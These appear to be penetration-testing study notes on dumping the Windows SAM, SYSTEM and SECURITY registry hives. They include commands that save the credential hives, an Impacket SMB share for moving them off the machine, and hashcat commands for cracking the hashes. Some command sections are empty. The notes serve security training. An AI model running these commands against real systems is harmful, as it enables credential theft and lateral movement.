# Attacking SAM, SYSTEM, and SECURITY

## Overview

With administrative access to a Windows system, attackers can dump registry hives containing:
- Local password hashes
- Cached domain credentials
- DPAPI secrets
- LSA secrets

These files can then be transferred to the attack machine and cracked offline.

Offline attacks are preferred because:
- No active session is required
- Reduces detection risk
- Allows long cracking operations

# Windows Registry Hives

Windows stores important authentication data inside registry hives.

---

## Important Registry Hives

| Hive | Purpose |
|------|----------|
| `HKLM\SAM` | Stores local user password hashes |
| `HKLM\SYSTEM` | Contains bootkey used to decrypt SAM |
| `HKLM\SECURITY` | Stores LSA secrets, cached creds, DPAPI keys |

---

# HKLM\SAM

Contains:
- Local account password hashes
- NTLM hashes
- User account information

Used for:
- Offline password cracking
- Pass-the-Hash attacks

---

# HKLM\SYSTEM

Contains:
- System bootkey

Purpose:
- Required to decrypt SAM database

Without this hive:
- NTLM hashes cannot be decrypted

---

# HKLM\SECURITY

Contains:
- Cached domain logons (DCC2)
- LSA secrets
- DPAPI machine/user keys

May expose:
- Saved service passwords
- Browser credentials
- VPN credentials

---

# Save Registry Hives

Administrative privileges are required.

---

## Main Commands

```cmd
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

---

# Transfer Hive Files

After dumping the hives:
- Transfer them to attacker machine
- Usually done via SMB share

---

# Create SMB Share with Impacket

## Main Command

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/user/Documents/
```

---

# Important Option

```text
-smb2support
```

Needed because:
- SMBv1 is disabled on modern Windows systems

## Main Commands


# LM vs NTLM Hashes

| Type | Description |
|------|-------------|
| LM Hash | Older, weak Windows hash |
| NTLM Hash | Modern Windows hash |

---

# Important Note

Modern Windows systems mainly use:
```text
NTLM hashes
```

LM hashes are usually:
```text
aad3b435b51404eeaad3b435b51404ee
```

Meaning:
- LM hashing disabled

# DCC2 Hashes

## Overview

DCC2 (Domain Cached Credentials 2):
- Cached copies of domain credentials
- Stored in `HKLM\SECURITY`

Example:

```text
$DCC2$10240#administrator#HASH
```

---

# Important Characteristics

- Uses PBKDF2
- Much slower to crack
- Cannot be used in Pass-the-Hash

---

# Hashcat Mode

```text
2100 = DCC2
```

---

# Crack DCC2 Hash

## Main Command

```bash
hashcat -m 2100 <hash> rockyou.txt
```

---

# Important Note

DCC2 cracking is significantly slower than NTLM.

Example:
- NTLM → millions/sec
- DCC2 → thousands/sec

---

# DPAPI

## Overview

DPAPI (Data Protection API) encrypts:
- Browser passwords
- RDP credentials
- VPN credentials
- Outlook passwords

---

# Applications Using DPAPI

| Application | Stored Data |
|-------------|-------------|
| Chrome | Saved passwords |
| Outlook | Email passwords |
| RDP | Saved remote creds |
| Credential Manager | Windows credentials |

LSA secrets may contain:

- DPAPI keys


NetExec can also dump SAM hashes remotely.

---

# Main Command

```bash

```

---

# Key Points

- `SAM` stores local NTLM hashes
- `SYSTEM` contains bootkey needed for decryption
- `SECURITY` stores DCC2, DPAPI, and LSA secrets
- `secretsdump.py` extracts credentials offline
- `hashcat -m 1000` used for NTLM
- `hashcat -m 2100` used for DCC2

---

# Important Notes

- Administrative privileges required
- NTLM hashes crack faster than DCC2
- DPAPI may expose plaintext credentials
- Offline cracking reduces detection
- Password reuse increases attack success

---

# One-Line Revision

Dumping SAM, SYSTEM, and SECURITY hives allows attackers to extract NTLM hashes, cached domain credentials, DPAPI secrets, and LSA secrets for offline credential attacks and lateral movement.
